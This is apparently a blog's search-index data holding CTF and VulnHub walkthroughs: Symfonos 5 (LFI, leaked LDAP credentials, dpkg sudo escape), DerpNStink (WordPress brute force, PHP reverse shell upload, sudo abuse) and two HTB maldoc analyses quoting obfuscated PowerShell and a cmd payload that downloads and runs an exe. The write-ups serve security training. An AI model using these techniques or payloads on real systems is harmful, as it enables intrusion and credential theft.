/usr/share/seclists/Discovery/Web-Content/raft-large-files.txt -t 60 -x txt,php,bak/admin.php (Status: 200) [Size: 1650]/index.html (Status: 200) [Size: 207]/home.php (Status: 302) [Size: 979] [--&gt; admin.php]/logout.php (Status: 302) [Size: 0] [--&gt; admin.php]Exploitation Go to http://10.0.2.10/admin.php I tried a few LDAP injection payloads but they didn’t work. After some Googling, tried * for both username and password and that logged me in and took me to http://10.0.2.10/home.php.Webpage If we check the source for this http://10.0.2.10/home.php after logging in or before logging in if we intercept this request with ‘Intercept Server Responses’ turned on, we can see this hyperlink which shows a possibility of LFI vulnerability.&lt;a class=\"nav-link\" href=\"http://127.0.0.1/home.php?url=http://127.0.0.1/portraits.php\"&gt;Portraits&lt;/a&gt; If we click on ‘Portraits’, we are taken to:http://10.0.2.10/home.php?url=http://127.0.0.1/portraits.php As we can see, home.php?url= seems vulnerable to Local File Inclusion LFI vulnerability.http://10.0.2.10/home.php?url=/etc/passwd Note that this LFI will only work after you have logged in with *:*.root:x:0:0:root:/root:/bin/bashdaemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologinbin:x:2:2:bin:/bin:/usr/sbin/nologinsys:x:3:3:sys:/dev:/usr/sbin/nologinsync:x:4:65534:sync:/bin:/bin/syncgames:x:5:60:games:/usr/games:/usr/sbin/nologinman:x:6:12:man:/var/cache/man:/usr/sbin/nologinlp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologinmail:x:8:8:mail:/var/mail:/usr/sbin/nologinnews:x:9:9:news:/var/spool/news:/usr/sbin/nologinuucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologinproxy:x:13:13:proxy:/bin:/usr/sbin/nologinwww-data:x:33:33:www-data:/var/www:/usr/sbin/nologinbackup:x:34:34:backup:/var/backups:/usr/sbin/nologinlist:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologinirc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologingnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologinnobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin_apt:x:100:65534::/nonexistent:/usr/sbin/nologin We don’t see any usernames here. Now lets see if we can read the home.php file with LFI.http://10.0.2.10/home.php?url=home.php And if we check the source code with Ctrl + U, we can see some PHP code.&lt;?phpsession_start();if(!isset($_SESSION['loggedin'])){ header(\"Location: admin.php\"); exit;}if(!empty($_GET[\"url\"])){ $r = $_GET[\"url\"]; $result = file_get_contents($r);}?&gt; Lets check admin.php.http://10.0.2.10/home.php?url=admin.php It seems to load the same login page we saw but if we check its source with Ctrl + U, we can see some PHP code.&lt;?phpsession_start();if(isset($_SESSION[\"loggedin\"]) &amp;&amp; $_SESSION[\"loggedin\"] === true){ header(\"location: home.php\"); exit;}function authLdap($username, $password) { $ldap_ch = ldap_connect(\"ldap://172.18.0.22\"); ldap_set_option($ldap_ch, LDAP_OPT_PROTOCOL_VERSION, 3); if (!$ldap_ch) { return FALSE; } $bind = ldap_bind($ldap_ch, \"cn=admin,dc=symfonos,dc=local\", \"qMDdyZh3cT6eeAWD\"); if (!$bind) { return FALSE; } $filter = \"(&amp;(uid=$username)(userPassword=$password))\"; $result = ldap_search($ldap_ch, \"dc=symfonos,dc=local\", $filter); if (!$result) { return FALSE; } $info = ldap_get_entries($ldap_ch, $result); if (!($info) || ($info[\"count\"] == 0)) { return FALSE; } return TRUE;}if(isset($_GET['username']) &amp;&amp; isset($_GET['password'])){$username = urldecode($_GET['username']);$password = urldecode($_GET['password']);$bIsAuth = authLdap($username, $password); if (! $bIsAuth ) { $msg = \"Invalid login\"; } else { $_SESSION[\"loggedin\"] = true; header(\"location: home.php\"); exit; }}?&gt;LDAPSearchldapsearch -x -h 10.0.2.10 -b \"dc=symfonos,dc=local\" -D 'cn=admin,dc=symfonos,dc=local' -w \"qMDdyZh3cT6eeAWD\"# zeus, symfonos.localdn: uid=zeus,dc=symfonos,dc=localuid: zeuscn: zeussn: 3objectClass: topobjectClass: posixAccountobjectClass: inetOrgPersonloginShell: /bin/bashhomeDirectory: /home/zeusuidNumber: 14583102gidNumber: 14564100userPassword:: Y2V0a0tmNHdDdUhDOUZFVA==mail: zeus@symfonos.localgecos: Zeus Userecho \"Y2V0a0tmNHdDdUhDOUZFVA==\" | base64 -d cetkKf4wCuHC9FET So the password for user zeus is cetkKf4wCuHC9FET. Nmap ldap-search Script Nmap ldap-search Scriptnmap -p 389 --script ldap-search --script-args 'ldap.username=\"cn=admin,dc=symfonos,dc=local\",ldap.password=qMDdyZh3cT6eeAWD' 10.0.2.10PORT STATE SERVICE389/tcp open ldap| ldap-search:| Context: dc=symfonos,dc=local| dn: dc=symfonos,dc=local| objectClass: top| objectClass: dcObject| objectClass: organization| o: symfonos| dc: symfonos| dn: cn=admin,dc=symfonos,dc=local| objectClass: simpleSecurityObject| objectClass: organizationalRole| cn: admin| description: LDAP administrator| userPassword: {SSHA}UWYxvuhA0bWsjfr2bhtxQbapr9eSgKVm| dn: uid=zeus,dc=symfonos,dc=local| uid: zeus| cn: zeus| sn: 3| objectClass: top| objectClass: posixAccount| objectClass: inetOrgPerson| loginShell: /bin/bash| homeDirectory: /home/zeus| uidNumber: 14583102| gidNumber: 14564100| userPassword: cetkKf4wCuHC9FET| mail: zeus@symfonos.local|_ gecos: Zeus User We can see the credentials for user zeus:uid=zeus,dc=symfonos,dc=localuid: zeuscn: zeususerPassword: cetkKf4wCuHC9FETSSH User Access ssh zeus@10.0.2.10 =&gt; cetkKf4wCuHC9FET whoami =&gt; zeusPrivilege Escalation sudo -lUser zeus may run the following commands on symfonos5: (root) NOPASSWD: /usr/bin/dpkg GTFOBins dpkg sudo dpkg -l This will invoke a default pager, most likely less. Then we can type !/bin/sh and we will get root shell. !/bin/bash also works.Privilege Escalation cat /root/proof.txtPost Exploitation cat /etc/shadowroot:$6$LCi0CrNofw.bZNIH$1JzaRFhkZM5zjdzhkcHyRoNluDS2w40H99UpCJCAhjhIyltCRND/7yMqMIyZ77RZwK1VDqk9mwTuZ88eqxSEw.:18297:0:99999:7:::" }, { "title": "DerpNStink - VulnHub", "url": "/posts/VulnHub-DerpNStink/", "categories": "Writeups, VulnHub", "tags": "VulnHub, WordPress, MySQL", "date": "2021-05-05 23:27:39 +0000", "snippet": "DerpNStink VulnHub WalkthroughRecon &amp; Enumeration sudo netdiscover -i eth0 -r 10.0.2.0/24 DerpNStink IP: 10.0.2.8Nmap nmap -Pn -sS -p- -A 10.0.2.8 10.0.2.8:21/tcp =&gt; vsftpd 3.0.210.0.2.8:22/tcp =&gt; OpenSSH 6.6.1p1 10.0.2.8:80/tcp =&gt; Apache httpd 2.4.7 In HTML source code: flag1(52E37291AEDF6A46D7D0BB8A6312F4F9F1AA4975C248C3F0E008CBA09D6E9166) GoBustergobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://10.0.2.8 -t 60 -x txt/weblog (Status:301) [Size:304] [http://10.0.2.8/weblog/]/php (Status:301) [Size:301] [http://10.0.2.8/php/] /css (Status:301) [Size:301] [http://10.0.2.8/css/] /js (Status:301) [Size:300] [http://10.0.2.8/js/] /javascript (Status:301) [Size:308] [http://10.0.2.8/javascript/]/robots.txt (Status:200) [Size:53] /temporary (Status:301) [Size:307] [http://10.0.2.8/temporary/] /server-status (Status:403) [Size:288] /weblog redirected to http://derpnstink.local/weblog. So we will need to add it to the hosts file. echo 10.0.2.8 derpnstink.local | tee -a /etc/hosts Then visit http://derpnstink.local/weblog. Its a WordPress blog.Exploitationwpscan --url http://derpnstink.local/weblog -e at -e ap -e uWordPress theme in use: twentysixteenLocation: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/Last Updated: 2021-03-09T00:00:00.000ZReadme: http://derpnstink.local/weblog/wp-content/themes/twentysixteen/readme.txtThe version is out of date, the latest version is 2.4Plugin(s) Identified:slideshow-galleryLocation: http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/Last Updated: 2019-07-12T13:09:00.000ZThe version is out of date, the latest version is 1.6.12Found By: Urls In Homepage (Passive Detection)Version: 1.4.6 (100% confidence)Found By: Readme - Stable Tag (Aggressive Detection)- http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txtConfirmed By: Readme - ChangeLog Section (Aggressive Detection)- http://derpnstink.local/weblog/wp-content/plugins/slideshow-gallery/readme.txtUser(s) Identified:- admin We got a username: admin. Now to brute force for password:wpscan --url http://derpnstink.local/weblog/ -U admin -P /usr/share/wordlists/rockyou.txt -t 60Valid Combinations Found:Username: admin, Password: admin Honestly, I should have just tried admin:admin before even running wpscan but, oh well. Go to /weblog/wp-admin/ and log in with admin : admin Go to Slideshow, click on one of the available ones, in there, under Choose Image option, select a file to upload. Choose PHP reverse shell file (with IP and port changed to connect back to our Kali VM) and it will be accepted without even changing extension. Or you can use this exploit to upload the shell since we already have user credentials: WordPress Plugin Slideshow Gallery 1.4.6 - Arbitrary File Upload.python wp_slideshow_exploit.py -t http://derpnstink.local/weblog -u admin -p admin -f php-shell.php Start a netcat listener: nc -lvnp 1234 Then go back to Slideshow and click on the slideshow that has PHP reverse shell file and we will get a reverse shell as www-data. cd /var/www/html/weblog and ls -la We have read access to wp-config.php so cat wp-config.php/** The name of the database for WordPress */define('DB_NAME', 'wordpress');/** MySQL database username */define('DB_USER', 'root');/** MySQL database password */define('DB_PASSWORD', 'mysql'); mysql -u root -p =&gt; mysql show databases; use mysql; show tables; select * from user; DerpNStink MySQL Commands:DerpNStink MySQL Commands Dumping users &amp; passwords from MySQL:Dumping Users &amp; Passwords from MySQL And we get a few MySQL password hashes. Used CrackStation to crack them:root = E74858DB86EBA20BC33D0AECAE8A8108C56B17FA = mysqlunclestinky = 9B776AFB479B31E8047026F1185E952DD1E530CB = wedgie57phpmyadmin = 4ACFE3202A5FF5CF467898FC58AAB1D615029441 = admin Lets try unclestinky : wedgie57 on user stinky. su stinky =&gt; wedgie57 and it works. There is a ftp directory in /stinky and if we keep going in, there is a key.txt file which has ssh key for user stinky/home/stinky/ftp/files/ssh/ssh/ssh/ssh/ssh/ssh/ssh/key.txt But we can also get it from /home/stinky/.ssh cd /home/stinky/.ssh and start a python server with python3 -m http.server 5959 and then get the id_rsa key from derpnstink.local:5959/id_rsa using a browser or via wget. chmod 600 id_rsa and then log in via ssh: ssh -i id_rsa stinky@10.0.2.8 cd /home/stinky/Desktop &amp;&amp; ls -la cat flag.txtflag3(07f62b021771d3cf67e2e1faf18769cc5e5c119ad7d4d1847a11e11d6d5a7ecb) cd /home/stinky/Documents &amp;&amp; ls -la there is a derpissues.pcap file. strings derpissues.pcap to get the general idea of traffic recorded. There are a few HTTP POST requests in there without SSL/TLS, thus, unencrypted. So we can start looking at them. Or we can grep for the username we already have: mrderp. I tried it both ways. strings derpissues.pcap | grep -n mrderp This gives 7 results but the first one itself reveals the password that was used while creating the account for mrderp and the second one reveals it again when it was used for logging in as mrderp.56710:action=createuser&amp;_wpnonce_create-user=b250402af6&amp;_wp_http_referer=%2Fweblog%2Fwp-admin%2Fuser-new.php&amp;user_login=mrderp&amp;email=mrderp%40derpnstink.local&amp;first_name=mr&amp;last_name=derp&amp;url=%2Fhome%2Fmrderp&amp;pass1=derpderpderpderpderpderpderp&amp;pass1-text=derpderpderpderpderpderpderp&amp;pass2=derpderpderpderpderpderpderp&amp;pw_weak=on&amp;role=administrator&amp;createuser=Add+New+User57149:log=mrderp&amp;pwd=derpderpderpderpderpderpderp&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&amp;testcookie=1 The other method is to filter POST requests and to look for passwords in unencrypted/plain text parameters. So to filter the strings results for just those POST requests: strings derpissues.pcap | grep POST It lists all the POST requests but we can filter out the others that we don’t need and focus only on POST requests made to /weblog/wp-login.php strings derpissues.pcap | grep -A 20 \"POST /weblog/wp-login.php\" grep -A 20 to print the next 20 lines that come after the expected result of grep. Now there are only three such POST requests and the username and password payload being sent through them is in plain text.1: log=unclestinky%40derpnstink.local&amp;pwd=wedgie57&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&amp;testcookie=1c32: log=mrderp&amp;pwd=derpderpderpderpderpderpderp&amp;wp-submit=Log+In&amp;redirect_to=http%3A%2F%2Fderpnstink.local%2Fweblog%2Fwp-admin%2F&amp;testcookie=1 We already have stinky’s or unclestinky’s password: wedgie57 and now we also have mrderp’s password: derpderpderpderpderpderpderp su mrderp =&gt; derpderpderpderpderpderpderp and we are now logged in as mrderp! mrderp : derpderpderpderpderpderpderpPrivilege Escalation sudo -l =&gt; derpderpderpderpderpderpderpUser mrderp may run the following commands on DeRPnStiNK: (ALL) /home/mrderp/binaries/derpy* If you cd /home/mrderp/Desktop/ &amp;&amp; ls, there is a helpdesk.log file which has a pastebin link inside: https://pastebin.com/RzK9WfGw. This pastebin also tells us the same thing that sudo -l says. So back to privilege escalation, there is no /home/mrderp/binaries/ directory so lets create one. cd /home/mrderp and then mkdir binaries &amp;&amp; cd binaries Then create a bash script (any script/executable will work here) that we can execute with sudo. touch derpy.sh echo /bin/bash &gt; derpy.sh Then chmod +x derpy.sh and then execute it with: sudo ./derpy.sh and we are now root! whoami =&gt; root cd /root/Desktop &amp;&amp; ls -la cat flag.txtflag4(49dca65f362fee401292ed7ada96f96295eab1e589c52e4e66bf4aedda715fdd)Congrats on rooting my first VulnOS!Hit me up on twitter and let me know your thoughts!@securekomodo" }, { "title": "HTB Cyber Apocalypse CTF - Invitation", "url": "/posts/HTB-CTF-Invitation/", "categories": "Writeups, CTF", "tags": "HTB, CTF, Forensics, Maldocs, Malware Analysis", "date": "2021-04-26 23:47:41 +0000", "snippet": "Invitation - Maldoc Analysis Breakdown Extract the .docm file: unzip file.docm. We will get one directory named word which will have a vbaProject.bin file in it. Thats what we need. Use Python OleTools to read the vbaProject.bin file. olevba3 --decode --deobf --reveal vbaProject.bin (you can play around with these options but --deobf flag didn’t work for me so had to manually do everything. Maybe I was doing something wrong).Trick to deobfuscate malware code from Unicorns of Security’s writeup My favorite trick is always to ask malware to deobfuscate itself for us. It can save a lot of time in case of more complex obfuscation scenarios. In this case I added this one line to the code: ActiveDocument.Content.InsertAfter Text:=odsuozldxufm and then ran the macro again. We will get hundreds of hex strings (encoded VBA). Use a good code editor to copy all of them at once and paste it in CyberChef. In CyberChef, add ‘From Hex’, then add ‘From Base64’, then add ‘Remove null bytes’ to get rid of all the pesky little dots/periods and hit BAKE!. Decode Hex strings =&gt; Decode Base64 =&gt; Remove Null Bytes =&gt; Manual Code Review. We will find the strings for flag in the code upon code review but they are a bit jumbled up and reversed. So we will need to fix that manually to get the flag. And the flag string is in two different but similar code blocks. So we will also need to piece it together.SEt (\"G8\"+\"h\") ( \" ) )63]Rahc[,'raZ'EcalPeR- 43]Rahc[,)05]Rahc[+87]Rahc[+94]Rahc[( eCAlpERc- )';2'+'N'+'1'+'}atem_we'+'n_eht'+'_2N1 = n'+'gerr'+'aZ'(( ( )''niOj-'x'+]3,1[)(GNirTSot.EcNereFeRpEsOBREv$ ( . \" ) ;-jOIn ( lS (\"VAR\"+\"IaB\"+\"LE:g\"+\"8H\") ).VALue[ - 1.. - ( ( lS (\"VAR\"+\"IaB\"+\"LE:g\"+\"8H\") ).VALue.LengtH)] | IeX atem_we'+'n_eht'+'_2N1 =&gt; atem_wen_eht_ =&gt; _the_new_meta. ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( \")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&amp;| )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(\" ,'.' ,'R'+'iGHTtOl'+'eft' ) | FoREaCH-OBJecT {$_.VALUE} )) ) tX'+'jera_scodlam' The tXj or jXt reversed, is actually getting replaced with something else as we can see in the code, so it is not a part of the string we need. era_scodlam =&gt; maldocs_are And piecing everything together =&gt; CHTB{maldocs_are_the_new_meta}" }, { "title": "HTB Cyber Apocalypse CTF - AlienPhish", "url": "/posts/HTB-CTF-AlienPhish/", "categories": "Writeups, CTF", "tags": "HTB, CTF, Forensics, Maldocs, Malware Analysis", "date": "2021-04-26 23:47:41 +0000", "snippet": "AlienPhish - PowerPoint File Forensics I came up with this cool little trick on the spot and decided to use VS Code to just search through all the files at once. Extract the PowerPoint file with unzip file.pptx and then open the entire directory in VS Code (code . if you have it set up that way in terminal/env) for searching through all the files quickly and easily. I use VS Code. You can use any other code editor you use/like that can search through all the files at once (or you could use grep but I’d rather go through everything with a code editor when doing any kind of file forensics). Search for keywords like vba, cmd, exe, etc. Found what I wanted immediately in slide1.xml.rels file with cmd and exe keyword search. That file had a malicious cmd payload in Target attribute:&lt;Relationship Id=\"rId2\" Type=\"http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink\" Target=\"cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;amp;&amp;amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;amp;&amp;amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22\" TargetMode=\"External\"/&gt;\"cmd.exe%20/V:ON/C%22set%20yM=%22o$%20eliftuo-%20exe.x/neila.htraeyortsed/:ptth%20rwi%20;'exe.99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q'%20+%20pmet:vne$%20=%20o$%22%20c-%20llehsrewop&amp;amp;&amp;amp;for%20/L%20%25X%20in%20(122;-1;0)do%20set%20kCX=!kCX!!yM:~%25X,1!&amp;amp;&amp;amp;if%20%25X%20leq%200%20call%20%25kCX:*kCX!=%25%22\" We can tell from the URL exe.x/neila.htraeyortsed/:ptth that some part of the payload is reversed. But the file name that this powershell command is downloading looks like an encoded string. 99zP_MHMyNGNt9FM391ZOlGSzFDSwtnQUh0Q looked like an encoded value so went to CyberChef, reversed and decoded to Base64 and got the flag. Encoded Value =&gt; Reverse =&gt; Q0hUQntwSDFzSGlOZ193MF9tNGNyMHM_Pz99 =&gt; Base64 Decode =&gt; Flag =&gt; CHTB{pH1sHiNg_w0_m4cr0s&gt;??} But that flag was not accepted and showed incorrect. Probably some decoding error so I went back to CyberChef and in Base64 Decoding, there was an option for URL Safe decoding which gave =&gt; CHTB{pH1sHiNg_w0_m4cr0s???}. This was one accepted." } ]
